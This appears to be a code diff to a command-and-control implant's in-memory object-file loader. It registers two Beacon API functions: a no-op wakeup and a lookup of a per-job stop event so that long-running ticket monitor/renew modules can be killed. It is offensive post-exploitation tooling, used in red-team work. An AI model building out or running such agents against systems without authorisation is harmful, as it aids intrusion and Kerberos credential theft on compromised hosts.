@@ -71,6 +71,8 @@ COFFAPIFUNC BeaconApi[] = {
         { .NameHash = H_COFFAPI_BEACONDATASTOREUNPROTECTITEM, .Pointer = BeaconDataStoreUnprotectItem     },
         { .NameHash = H_COFFAPI_BEACONDATASTOREMAXENTRIES,    .Pointer = BeaconDataStoreMaxEntries        },
         { .NameHash = H_COFFAPI_BEACONGETCUSTOMUSERDATA,      .Pointer = BeaconGetCustomUserData          },
+        { .NameHash = H_COFFAPI_BEACONWAKEUP,                 .Pointer = BeaconWakeup                     },
+        { .NameHash = H_COFFAPI_BEACONGETSTOPJOBEVENT,        .Pointer = BeaconGetStopJobEvent            },
 
         // End of array
         { .NameHash = 0, .Pointer = NULL },
@@ -319,6 +321,47 @@ VOID BeaconOutput( INT Type, PCHAR data, INT len )
     PackageAddInt32( Package, Type );
     PackageAddBytes( Package, ( PBYTE ) data, len );
     PackageTransmit( Package );
+}
+
+/* Force the agent to surface pending BOF output sooner.
+ *
+ * BeaconPrintf/BeaconOutput already queue packages via PackageTransmit and
+ * they are flushed on the next check-in by the dispatcher thread. Calling
+ * PackageTransmitAll() from here would race with that same transmit path
+ * (two threads driving TransportSend at once), so this is intentionally a
+ * no-op: output is delivered on the next natural check-in, bounded by the
+ * configured sleep interval.
+ */
+VOID BeaconWakeup( VOID )
+{
+    return;
+}
+
+/* Return the stop event for the BOF executing on the current thread.
+ *
+ * Async BOFs (TGT monitor/renew) poll this event in a loop and exit when it
+ * is signalled; JobKill signals it so a long-running inline-execute can be
+ * cancelled instead of leaving its thread stuck polling forever.
+ */
+HANDLE BeaconGetStopJobEvent( VOID )
+{
+    PVOID   CoffeeFunctionReturn = __builtin_return_address( 0 );
+    UINT32  RequestID            = 0;
+    PCOFFEE Entry                = NULL;
+
+    if ( ! GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) )
+        return NULL;
+
+    Entry = Instance->Coffees;
+    while ( Entry )
+    {
+        if ( Entry->RequestID == RequestID )
+            return Entry->StopEvent;
+
+        Entry = Entry->Next;
+    }
+
+    return NULL;
 }
 
 BOOL BeaconIsAdmin(
